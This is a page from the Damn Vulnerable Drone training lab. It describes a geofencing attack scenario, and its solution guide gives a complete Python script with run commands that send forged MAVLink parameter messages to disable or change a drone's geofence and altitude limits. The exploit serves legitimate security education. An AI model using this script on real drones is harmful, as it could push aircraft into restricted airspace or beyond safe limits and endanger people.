<i>Manipulating MAVLink messages to alter the geofencing parameters of a drone, allowing it to enter restricted areas or exceed altitude limits.</i>

[Damn Vulnerable Drone](/nicholasaleks/Damn-Vulnerable-Drone) > [Attack Scenarios](/nicholasaleks/Damn-Vulnerable-Drone/wiki/Attack-Scenarios) > Denial of Service > Geofencing Attack

# Description

A geofencing attack involves sending malicious MAVLink messages to change the geofencing settings of a drone. This can be used to disable the geofence, change its boundaries, or alter its behavior upon breach, allowing the drone to enter restricted or dangerous areas.

# Resources

- <a href="https://mavlink.io/en/">MAVLink Protocol</a>  
- <a href="https://ardupilot.org/plane/docs/common-geofencing-landing-page.html#common-geofencing-landing-page">ArduPilot GeoFencing</a>

---

<details>
<summary><strong>⚠️ Solution Guide</strong></summary>

<h3>Step 1. Setup</h3>
<pre><code class="code mb-3 mt-3">sudo apt-get update
sudo apt-get install python3 python3-pip
pip3 install pymavlink scapy
</code></pre>

---

<h3>Step 2. Create the Script</h3>
<p>Save the following code as <code>geo-fencing.py</code>:</p>

<pre><code class="code mb-3 mt-3">from pymavlink import mavutil
from scapy.all import *
import sys
import socket

def set_param(mav, param_id, param_value, param_type):
    return mav.param_set_encode(
        target_system=mav.target_system,
        target_component=mav.target_component,
        param_id=param_id.encode('utf-8'),
        param_value=param_value,
        param_type=param_type
    ).pack(mav)

def send_mavlink_packet_tcp(packet_data, target_ip, target_port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target_ip, target_port))
    sock.send(packet_data)
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python geo-fencing.py &lt;ip:port&gt; &lt;action&gt;")
        print("Actions: disable, enable, set_radius:&lt;value&gt;, set_alt_max:&lt;value&gt;, set_action:&lt;value&gt;")
        sys.exit(1)

    target = sys.argv[1]
    action = sys.argv[2]
    target_ip, target_port = target.split(':')
    target_port = int(target_port)

    mav = mavutil.mavlink.MAVLink(None)
    mav.target_system = 1
    mav.target_component = 1

    if action == "disable":
        packet = set_param(mav, 'FENCE_ENABLE', 0, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        send_mavlink_packet_tcp(packet, target_ip, target_port)
        print("Geofence disabled")
    elif action == "enable":
        packet = set_param(mav, 'FENCE_ENABLE', 1, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        send_mavlink_packet_tcp(packet, target_ip, target_port)
        print("Geofence enabled")
    elif action.startswith("set_radius:"):
        value = float(action.split(":")[1])
        packet = set_param(mav, 'FENCE_ENABLE', 1, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        send_mavlink_packet_tcp(packet, target_ip, target_port)
        packet = set_param(mav, 'FENCE_RADIUS', value, mavutil.mavlink.MAV_PARAM_TYPE_REAL32)
        send_mavlink_packet_tcp(packet, target_ip, target_port)
        print(f"Geofence radius set to {value} meters")
    elif action.startswith("set_alt_max:"):
        value = float(action.split(":")[1])
        packet = set_param(mav, 'FENCE_ENABLE', 1, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        send_mavlink_packet_tcp(packet, target_ip, target_port)
        packet = set_param(mav, 'FENCE_ALT_MAX', value, mavutil.mavlink.MAV_PARAM_TYPE_REAL32)
        send_mavlink_packet_tcp(packet, target_ip, target_port)
        print(f"Geofence maximum altitude set to {value} meters")
    elif action.startswith("set_action:"):
        value = int(action.split(":")[1])
        packet = set_param(mav, 'FENCE_ENABLE', 1, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        send_mavlink_packet_tcp(packet, target_ip, target_port)
        packet = set_param(mav, 'FENCE_ACTION', value, mavutil.mavlink.MAV_PARAM_TYPE_UINT8)
        send_mavlink_packet_tcp(packet, target_ip, target_port)
        print(f"Geofence breach action set to {value}")
    else:
        print("Invalid action. Actions: disable, enable, set_radius:&lt;value&gt;, set_alt_max:&lt;value&gt;, set_action:&lt;value&gt;")
        sys.exit(1)
</code></pre>

---

<h3>Step 3. Run the Script</h3>
<p>Use the following command to run the script:</p>

<pre><code class="code mb-3 mt-3">sudo python3 geo-fencing.py 10.13.0.3:5760 disable</code></pre>

<p>You can replace the <code>disable</code> action with any of the following:</p>
<ul>
  <li><code>enable</code></li>
  <li><code>set_radius:150</code></li>
  <li><code>set_alt_max:120</code></li>
  <li><code>set_action:1</code> (e.g., RTL or Land on breach)</li>
</ul>

---

<h3>Step 4. Monitor the Effects</h3>
<p>Use the GCS or CLI tools to confirm that:</p>
<ul>
  <li>The fence was enabled or disabled</li>
  <li>The radius or altitude limit was changed</li>
  <li>The geofence breach action is updated</li>
</ul>

<p>Use this to bypass operational constraints or test response behavior to rogue settings.</p>

</details>
